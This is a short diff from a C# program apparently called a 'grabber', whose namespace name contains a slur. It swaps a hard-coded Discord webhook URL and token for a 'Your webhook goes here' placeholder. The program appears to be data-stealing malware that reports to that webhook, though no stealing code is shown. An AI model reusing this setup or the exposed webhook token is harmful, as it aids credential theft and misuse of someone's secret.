@@ -11,7 +11,7 @@ namespace retardGrabber
     internal class Program
     {
         private const string V = $@"{{{nameof(GetDebuggerDisplay)}(),nq}}";
-        private static readonly string webhook = "https://discord.com/api/webhooks/889584577608314930/yf3rfA53pxeBj5h9zCrgKzOj7m8k3CpQ8rZ3p_I8pKz6b7FfniI6o9wnA1B8tBiab8jC"; // Your webhook goes here
+        private static readonly string webhook = "here"; // Your webhook goes here
         private static bool foundSth;
 
         private static void Main()
